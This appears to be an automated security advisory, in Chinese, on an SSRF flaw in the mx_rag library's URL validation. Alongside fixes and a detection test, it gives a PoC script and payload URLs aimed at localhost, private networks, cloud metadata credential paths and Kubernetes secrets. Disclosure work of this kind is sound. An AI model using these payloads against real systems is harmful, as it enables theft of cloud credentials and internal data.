# VULN-001-SSRF: Server-Side Request Forgery (SSRF) Vulnerability

## 漏洞概述

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-001-SSRF |
| 漏洞类型 | SSRF (Server-Side Request Forgery) |
| CWE编号 | CWE-918 |
| 严重程度 | **高危 (High)** |
| 影响文件 | `mx_rag/utils/url.py`, `mx_rag/utils/url_checker.py` |
| 影响函数 | `is_url_valid()`, `HttpUrlChecker`, `HttpsUrlChecker`, `RequestUtils.post()` |

---

## 1. 漏洞详情

### 1.1 漏洞代码分析

#### URL 验证器缺陷 (`mx_rag/utils/url_checker.py:179-188`)

```python
class HttpUrlChecker(RegexStringChecker):
    def __init__(self, attr_name: str = None, min_len: int = 0, max_len: int = 2048, required: bool = True):
        super().__init__(attr_name, "(http|HTTP)://[-A-Za-z0-9+&/%=~_|!:,.;]*[-A-Za-z0-9+&/%=~_|]", min_len,
                         max_len, required)

class HttpsUrlChecker(RegexStringChecker):
    def __init__(self, attr_name: str = None, min_len: int = 0, max_len: int = 2048, required: bool = True):
        super().__init__(attr_name, "(https|HTTPS)://[-A-Za-z0-9+&/%=~_|!:,.;]*[-A-Za-z0-9+&/%=~_|]", min_len,
                         max_len, required)
```

**问题**：正则表达式仅验证 URL 格式，未对目标地址进行安全检查：
- ❌ 未阻止 `localhost` / `127.0.0.1`
- ❌ 未阻止私有 IP 地址（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16）
- ❌ 未阻止链路本地地址（169.254.0.0/16）
- ❌ 未阻止云元数据端点（如 169.254.169.254）
- ❌ 未防止 DNS rebinding 攻击

#### URL 验证入口 (`mx_rag/utils/url.py:49-57`)

```python
def is_url_valid(url, use_http) -> bool:
    if url.startswith("http:") and not use_http:
        return False
    check_key = "url"
    if use_http and HttpUrlChecker(check_key).check({check_key: url}):
        return True
    elif not use_http and HttpsUrlChecker(check_key).check({check_key: url}):
        return True
    return False
```

**问题**：仅检查协议类型和正则匹配，无目标地址白名单/黑名单验证。

#### HTTP 请求执行 (`mx_rag/utils/url.py:110-130`)

```python
def post(self, url: str, body: str, headers: Dict):
    if not is_url_valid(url, self.use_http):
        logger.error("url check failed")
        return Result(False, "")
    
    try:
        response = self.pool.request(method='POST',
                                     url=url,
                                     body=body,
                                     headers=headers,
                                     preload_content=False)
    # ... 后续处理
```

**问题**：通过 `is_url_valid()` 检查后直接发起请求，无二次验证。

---

## 2. 完整攻击路径

### 2.1 数据流图

```
[用户输入 URL]
      │
      ▼
┌─────────────────────────────────────────────────────────────┐
│ 入口点 (多个服务类接受 URL 参数)                              │
│ - Text2TextLLM(base_url, ...)                               │
│ - Img2TextLLM(base_url, ...)                                │
│ - Text2ImgMultiModel(url, ...)                              │
│ - TEIEmbedding(url, ...)                                    │
│ - CLIPEmbedding(url, ...)                                   │
│ - TEIReranker(url, ...)                                     │
└─────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────┐
│ RequestUtils.post(url, body, headers)                       │
│ mx_rag/utils/url.py:110                                     │
└─────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────┐
│ is_url_valid(url, use_http)                                 │
│ mx_rag/utils/url.py:49-57                                   │
│                                                             │
│ [WEAK POINT] 仅检查 URL 格式正则匹配                          │
│ - HttpUrlChecker: 正则 "(http|HTTP)://..."                  │
│ - HttpsUrlChecker: 正则 "(https|HTTPS)://..."               │
│ - 无 IP 地址范围过滤                                        │
│ - 无 DNS rebinding 防护                                     │
└─────────────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────────────┐
│ urllib3.PoolManager.request('POST', url, ...)              │
│ mx_rag/utils/url.py:116-120                                 │
│                                                             │
│ [SSRF TRIGGER] 服务器发起任意 HTTP 请求                      │
└─────────────────────────────────────────────────────────────┘
      │
      ▼
[攻击者控制的目标: 内网服务、云元数据等]
```

### 2.2 攻击场景

#### 场景1: 访问内网服务
```python
# 攻击者配置恶意 URL
llm = Text2TextLLM(
    base_url="http://192.168.1.100:8080/admin",  # 内网管理接口
    model_name="gpt-4",
    client_param=ClientParam(use_http=True)
)
llm.chat("malicious query")  # 触发 SSRF
```

#### 场景2: 访问云元数据服务
```python
# AWS/GCP/Azure 元数据服务
llm = Text2TextLLM(
    base_url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    model_name="gpt-4",
    client_param=ClientParam(use_http=True)
)
llm.chat("query")  # 泄露 IAM 凭证
```

#### 场景3: 端口扫描
```python
# 探测内网服务
embedding = TEIEmbedding(
    url="http://10.0.0.1:22/embed",  # 探测 SSH 端口
    client_param=ClientParam(use_http=True)
)
embedding.embed_documents(["test"])  # 根据响应时间/错误判断端口状态
```

---

## 3. PoC 构造思路

### 3.1 恶意 URL 构造方法

#### 访问本地服务
```
http://localhost/admin
http://127.0.0.1:8080/internal
http://[::1]:8080/          # IPv6 本地地址
```

#### 访问私有网段
```
http://10.0.0.1/            # A类私有地址
http://172.16.0.1/           # B类私有地址
http://192.168.1.1/          # C类私有地址
http://192.168.1.1:6379/     # Redis 服务
```

#### 云环境攻击
```
# AWS 元数据
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP 元数据
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure 元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### DNS Rebinding 绕过
```
http://attacker-controlled-domain.com/redirect-to-internal
```

### 3.2 完整 PoC 代码

```python
#!/usr/bin/env python3
"""
SSRF PoC - 演示 URL 验证绕过
"""
from mx_rag.llm.text2text import Text2TextLLM
from mx_rag.utils import ClientParam

# PoC 1: 访问本地服务
print("[*] PoC 1: Accessing localhost")
llm_local = Text2TextLLM(
    base_url="http://127.0.0.1:8080/v1/chat/completions",
    model_name="test",
    client_param=ClientParam(use_http=True)
)
result = llm_local.chat("test")
print(f"Result: {result}")

# PoC 2: 访问内网 IP
print("[*] PoC 2: Accessing internal network")
llm_internal = Text2TextLLM(
    base_url="http://192.168.1.1:8080/v1/chat/completions",
    model_name="test",
    client_param=ClientParam(use_http=True)
)
result = llm_internal.chat("test")
print(f"Result: {result}")

# PoC 3: 访问云元数据服务 (云环境)
print("[*] PoC 3: Accessing cloud metadata service")
llm_metadata = Text2TextLLM(
    base_url="http://169.254.169.254/latest/meta-data/",
    model_name="test",
    client_param=ClientParam(use_http=True)
)
result = llm_metadata.chat("test")
print(f"Result: {result}")
```

---

## 4. 影响范围

### 4.1 受影响组件

| 组件 | 文件路径 | 入口函数 |
|------|----------|----------|
| LLM 文本服务 | `mx_rag/llm/text2text.py` | `Text2TextLLM.__init__(base_url)` |
| LLM 图文服务 | `mx_rag/llm/img2text.py` | `Img2TextLLM.__init__(base_url)` |
| LLM 文图服务 | `mx_rag/llm/text2img.py` | `Text2ImgMultiModel.__init__(url)` |
| Embedding TEI | `mx_rag/embedding/service/tei_embedding.py` | `TEIEmbedding.__init__(url)` |
| Embedding CLIP | `mx_rag/embedding/service/clip_embedding.py` | `CLIPEmbedding.__init__(url)` |
| Reranker TEI | `mx_rag/reranker/service/tei_reranker.py` | `TEIReranker.__init__(url)` |

### 4.2 攻击面评估

| 攻击目标 | 可能性 | 影响 |
|----------|--------|------|
| 内网服务探测 | 高 | 内网拓扑泄露 |
| 敏感接口访问 | 高 | 数据泄露/权限提升 |
| 云元数据获取 | 中 (依赖云环境) | 云凭证泄露 |
| SSRF to RCE | 中 | 服务器被控制 |

---

## 5. 利用条件

### 5.1 前置条件

1. **攻击者可控制 URL 参数**
   - 应用程序允许用户配置 LLM/Embedding/Reranker 服务端点
   - 或通过配置文件/环境变量注入恶意 URL

2. **网络可达性**
   - HTTP 模式：`use_http=True`，可直接访问任意 HTTP 端点
   - HTTPS 模式：需要有效证书或绕过证书验证

3. **部署场景**
   - **容器部署**：攻击者可访问容器网络内的其他服务
   - **云环境部署**：攻击者可访问云元数据服务
   - **K8s 集群**：攻击者可访问集群内部服务

### 5.2 利用难度

- **难度等级**：低
- **无需认证**：URL 参数通常是配置项，无需特殊权限
- **无需特殊工具**：仅需构造恶意 URL

---

## 6. 风险评估

### 6.1 CVSS 评分

**CVSS v3.1: 8.6 (High)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

- **AV:N** - 网络可达
- **AC:L** - 低攻击复杂度
- **PR:N** - 无需权限
- **UI:N** - 无需用户交互
- **S:U** - 影响范围为未改变
- **C:H** - 高机密性影响
- **I:H** - 高完整性影响
- **A:N** - 无可用性影响

### 6.2 容器/K8s 部署场景特别风险

在容器化环境中，风险更高：

1. **服务发现**：攻击者可探测同一集群/网络内的其他微服务
2. **K8s API 访问**：可能访问 K8s Service Account Token
3. **云元数据**：在云托管 K8s 中可获取云凭证
4. **内部 API**：跳过防火墙访问内部服务

```
攻击示例 - K8s 环境:
http://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/secrets
```

---

## 7. 修复建议

### 7.1 短期修复 - IP 地址黑名单

```python
# mx_rag/utils/url_checker.py
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Loopback
    ipaddress.ip_network('10.0.0.0/8'),        # Private A
    ipaddress.ip_network('172.16.0.0/12'),    # Private B
    ipaddress.ip_network('192.168.0.0/16'),   # Private C
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local
    ipaddress.ip_network('0.0.0.0/8'),        # "This" network
    ipaddress.ip_network('::1/128'),          # IPv6 loopback
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

def is_ip_blocked(hostname: str) -> bool:
    """检查解析后的 IP 是否在黑名单中"""
    try:
        # DNS 解析
        ip_str = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(ip_str)
        
        for network in BLOCKED_IP_RANGES:
            if ip in network:
                return True
        return False
    except socket.gaierror:
        return False  # DNS 解析失败

def is_url_safe(url: str) -> bool:
    """完整 URL 安全检查"""
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        
        if not hostname:
            return False
        
        # 检查 IP 黑名单
        if is_ip_blocked(hostname):
            return False
        
        return True
    except Exception:
        return False
```

### 7.2 中期修复 - 白名单机制

```python
# 配置允许的域名/IP 白名单
ALLOWED_HOSTS = [
    "api.openai.com",
    "api.anthropic.com",
    # 其他合法服务端点
]

def is_url_allowed(url: str, allowed_hosts: list) -> bool:
    """仅允许白名单中的目标"""
    parsed = urlparse(url)
    return parsed.hostname in allowed_hosts
```

### 7.3 长期修复 - 架构改进

1. **服务发现机制**：使用服务名而非 URL，避免直接暴露端点配置
2. **代理层**：通过专用代理服务转发请求，代理层实现安全策略
3. **网络隔离**：服务运行在受限网络环境中，限制出站连接

---

## 8. 检测方法

### 8.1 静态检测

```bash
# 检查 URL 验证逻辑
grep -r "is_url_valid\|HttpUrlChecker\|HttpsUrlChecker" mx_rag/
```

### 8.2 动态检测

```python
# 单元测试检测 SSRF
def test_ssrf_protection():
    dangerous_urls = [
        "http://127.0.0.1:8080/admin",
        "http://localhost/internal",
        "http://192.168.1.1/secret",
        "http://10.0.0.1/api",
        "http://169.254.169.254/metadata",
    ]
    
    for url in dangerous_urls:
        assert not is_url_safe(url), f"URL should be blocked: {url}"
```

---

## 9. 结论

**这是一个真实的高危 SSRF 漏洞**，影响所有使用 RAGSDK 进行外部服务调用的场景。漏洞根因是 URL 验证仅依赖正则表达式匹配格式，未对目标 IP 地址进行安全检查。

在云环境或容器化部署场景下，攻击者可能：
- 获取云服务凭证
- 访问内网敏感服务
- 探测内网拓扑
- 绕过网络边界防护

**建议立即实施修复方案**，优先采用 IP 黑名单 + DNS 解析检查的方式。

---

*报告生成时间: 2026-04-20*
*漏洞分析工具: OpenCode Vulnerability Scanner*
